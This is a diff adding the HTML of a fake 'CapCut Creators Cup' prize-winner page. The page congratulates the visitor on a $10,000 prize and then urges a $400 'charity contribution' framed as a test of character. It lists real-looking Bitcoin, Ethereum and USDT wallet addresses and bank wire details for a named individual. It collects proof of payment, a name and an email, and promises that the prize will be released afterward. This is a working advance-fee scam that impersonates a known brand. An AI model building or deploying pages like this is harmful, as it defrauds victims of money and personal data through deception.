@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>You Won — CapCut Creators Cup</title>
+<meta name="description" content="Congratulations — you've won the CapCut Creators Cup." />
+<meta name="robots" content="noindex,nofollow" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+<!-- NAV -->
+<header class="nav">
+  <div class="container nav-inner">
+    <a href="index.html" class="logo">
+      <span class="logo-mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><line x1="20" y1="4" x2="8.12" y2="15.88"/><line x1="14.47" y1="14.48" x2="20" y2="20"/><line x1="8.12" y1="8.12" x2="12" y2="12"/></svg>
+      </span>
+      <span class="logo-text">CapCut <span class="accent">Creators Cup</span></span>
+    </a>
+    <a href="index.html" class="btn btn-outline btn-sm">← Home</a>
+  </div>
+</header>
+
+<!-- CONGRATS BANNER -->
+<section class="reward-banner">
+  <div class="hero-glow"></div>
+  <div class="container center">
+    <div class="trophy">🏆</div>
+    <div class="pill"><span class="dot"></span> Season 05 · Official winner</div>
+    <h1 class="display reward-title">
+      Congratulations, <span class="gradient-text">Champion!</span>
+    </h1>
+    <p class="lead" style="max-width:720px;margin:18px auto 0">
+      Out of thousands of entries from creators across the globe, your project
+      rose above the rest. The judging panel was captivated by your storytelling,
+      your pacing, your sense of rhythm, and the sheer creativity stitched into
+      every cut. You didn't just edit a video — you shaped a feeling. On behalf
+      of the entire CapCut team, thank you for reminding the community what's
+      possible when imagination meets craft.
+    </p>
+  </div>
+</section>
+
+<!-- PRIZE -->
+<section class="about">
+  <div class="container">
+    <div class="prize-card">
+      <div class="prize-label">Grand prize</div>
+      <div class="prize-amount">$10,000<span>USD</span></div>
+      <p class="prize-note">
+        As part of the Creators Cup tradition, every season's champion is invited
+        to make a contribution of <b>$400</b> to our charity partners. This gesture isn't a
+        requirement — it's a reflection of who our winners are: artists who lead
+        with empathy, generosity, and a belief that creativity should leave the
+        world a little better than they found it. Choosing to give signals
+        humility, selflessness, and the kind of character that the next
+        generation of editors will look up to.
+      </p>
+      <button id="openDonate" class="btn btn-primary btn-lg">
+        ❤️ Donate $400 to charity partners
+      </button>
+    </div>
+
+    <!-- DONATION FLOW -->
+    <div id="donateFlow" class="donate-flow" hidden>
+      <h2 class="section-title">Choose a payment method</h2>
+      <div class="method-grid">
+        <button type="button" class="method-btn" data-method="crypto">
+          <div class="method-ico">₿</div>
+          <div>
+            <strong>Crypto payment</strong>
+            <small class="muted">BTC · ETH · USDT</small>
+          </div>
+        </button>
+        <button type="button" class="method-btn" data-method="bank">
+          <div class="method-ico">🏦</div>
+          <div>
+            <strong>Bank transfer</strong>
+            <small class="muted">International wire</small>
+          </div>
+        </button>
+      </div>
+
+      <!-- CRYPTO DETAILS -->
+      <details id="cryptoBox" class="details-box">
+        <summary>Crypto wallet details</summary>
+        <div class="details-body">
+          <div class="detail-row"><span class="muted">Network</span><strong>Bitcoin (BTC)</strong></div>
+          <div class="detail-row"><span class="muted">Wallet address</span>
+            <code class="addr">bc1q0n5edtj7yvw7rhrkghlc95v76lzpt78nz3xnr5</code>
+          </div>
+          <div class="detail-row"><span class="muted">Amount</span>
+            <code class="addr">0.00632</code>
+          </div>
+          <hr/>
+          <div class="detail-row"><span class="muted">Network</span><strong>Ethereum (ETH / USDT ERC-20)</strong></div>
+          <div class="detail-row"><span class="muted">Wallet address</span>
+            <code class="addr">0x4ebf0cea9df522d855c27838170166f7a70cefd8</code>
+          </div>
+          <div class="detail-row"><span class="muted">Amount</span>
+            <code class="addr">0.2406</code>
+          </div>
+          <hr/>
+          <div class="detail-row"><span class="muted">Network</span><strong>USDT (TRC-20)</strong></div>
+          <div class="detail-row"><span class="muted">Wallet address</span>
+            <code class="addr">TWGkNTvRca2vYGzrukTH3avsF7V4ZebAoo</code>
+          </div>
+          <div class="detail-row"><span class="muted">Amount</span>
+            <code class="addr">400</code>
+          </div>
+          <p class="muted small">After sending, upload your transaction screenshot below.</p>
+        </div>
+      </details>
+
+      <!-- BANK DETAILS -->
+      <details id="bankBox" class="details-box">
+        <summary>Bank transfer details</summary>
+        <div class="details-body">
+          <div class="detail-row"><span class="muted">Bank name</span><strong>Clear Junction Limited</strong></div>
+          <div class="detail-row"><span class="muted">Account name</span><strong>CapCut Creators Cup Coordinator — Justice Osayame Aighbobani</strong></div>
+          <div class="detail-row"><span class="muted">Account number</span><strong>42717009</strong></div>
+          <div class="detail-row"><span class="muted">IBAN</span><strong>GB35 CLJU 0413 0742 7170 09</strong></div>
+          <div class="detail-row"><span class="muted">SWIFT / BIC</span><strong>CLJUGB21XXX</strong></div>
+          <div class="detail-row"><span class="muted">Amount</span><strong>$400</strong></div>
+          <p class="muted small">After sending, upload your transfer receipt below.</p>
+        </div>
+      </details>
+
+      <!-- PROOF FORM -->
+      <form id="proofForm" class="form-card" novalidate hidden>
+        <h3 style="margin-top:0">Upload proof of payment</h3>
+
+        <div class="form-grid">
+          <div class="field">
+            <label for="winnerName">Full name</label>
+            <input id="winnerName" type="text" maxlength="100" required placeholder="Jane Doe" />
+            <small class="err" data-for="winnerName"></small>
+          </div>
+          <div class="field">
+            <label for="winnerEmail">Email</label>
+            <input id="winnerEmail" type="email" maxlength="120" required placeholder="you@email.com" />
+            <small class="err" data-for="winnerEmail"></small>
+          </div>
+
+          <div class="field full">
+            <label for="proof">Payment proof (screenshot)</label>
+            <div class="upload" id="proofDrop">
+              <input id="proof" type="file" accept="image/*,application/pdf" hidden />
+              <div class="upload-inner">
+                <div class="upload-ico">📎</div>
+                <div><strong>Click to upload</strong> your receipt or screenshot</div>
+                <small class="muted">PNG, JPG, or PDF · max 10MB</small>
+              </div>
+              <img id="proofPreview" alt="" hidden />
+              <div id="proofName" class="file-name" hidden></div>
+            </div>
+            <small class="err" data-for="proof"></small>
+          </div>
+
+          <div class="field full">
+            <label for="notes">Notes <span class="muted small">(optional)</span></label>
+            <textarea id="notes" rows="3" maxlength="500" placeholder="Transaction hash, reference, anything we should know…"></textarea>
+          </div>
+        </div>
+
+        <input type="hidden" id="method" value="" />
+        <button type="submit" class="btn btn-primary btn-lg full-w">↑ Submit proof of payment</button>
+      </form>
+    </div>
+
+    <!-- SUCCESS -->
+    <div id="proofSuccess" class="success-card" hidden>
+      <div class="success-ico">✓</div>
+      <h2>Thank you for your generosity</h2>
+      <p class="muted">
+        Your proof of payment has been received and forwarded to the CapCut
+        Creators Cup team. Our charity partners — and the communities they
+        serve — are deeply grateful for your contribution.
+      </p>
+      <p class="muted">
+        A formal acknowledgement letter and your prize-release documentation
+        will be sent to your email within 3–5 business days.
+      </p>
+      <a href="index.html" class="btn btn-outline btn-lg" style="margin-top:8px">Back to home</a>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container foot-inner">
+    <div>© 2026 CapCut Creators Cup</div>
+    <div>An official CapCut initiative.</div>
+  </div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="supabase-config.js"></script>
+<script src="reward.js"></script>
+</body>
+</html>
